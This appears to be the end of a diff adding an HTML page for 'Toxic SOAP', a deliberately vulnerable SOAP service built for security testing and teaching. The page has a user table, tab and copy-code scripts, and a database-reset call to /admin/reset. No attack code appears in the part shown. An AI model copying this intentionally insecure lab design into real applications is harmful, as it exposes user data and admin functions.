+            <div class="section">
+                <h3>Users</h3>
+                <table>
+                    <tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th></tr>
+                    <tr th:each="user : ${users}">
+                        <td th:text="${user.ID}"></td>
+                        <td th:text="${user.USERNAME}"></td>
+                        <td th:text="${user.EMAIL}"></td>
+                        <td th:text="${user.ROLE}"></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>Toxic SOAP - Deliberately Vulnerable SOAP Service for Security Testing</p>
+        <p>For educational and authorized testing purposes only. <a href="https://github.com" target="_blank">Documentation</a></p>
+    </footer>
+
+    <script>
+        function showTab(tabId) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            document.querySelector(`[onclick="showTab('${tabId}')"]`).classList.add('active');
+            document.getElementById(tabId).classList.add('active');
+        }
+
+        function toggleVuln(header) {
+            const body = header.nextElementSibling;
+            const chevron = header.querySelector('.chevron');
+            body.classList.toggle('open');
+            chevron.classList.toggle('open');
+        }
+
+        function copyCode(btn) {
+            const code = btn.parentElement.querySelector('code').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'Copied!';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.textContent = 'Copy';
+                    btn.classList.remove('copied');
+                }, 2000);
+            });
+        }
+
+        function resetDatabase() {
+            const resultDivs = [document.getElementById('resetResult'), document.getElementById('resetResult2')];
+            resultDivs.forEach(div => { if(div) { div.className = ''; div.style.display = 'none'; }});
+
+            fetch('/admin/reset', { method: 'POST' })
+                .then(response => response.json())
+                .then(data => {
+                    resultDivs.forEach(div => {
+                        if(div) {
+                            div.textContent = data.message;
+                            div.className = data.success ? 'success' : 'error';
+                        }
+                    });
+                    if (data.success) {
+                        setTimeout(() => location.reload(), 1000);
+                    }
+                })
+                .catch(error => {
+                    resultDivs.forEach(div => {
+                        if(div) {
+                            div.textContent = 'Request failed: ' + error;
+                            div.className = 'error';
+                        }
+                    });
+                });
+        }
+    </script>
+</body>
+</html>
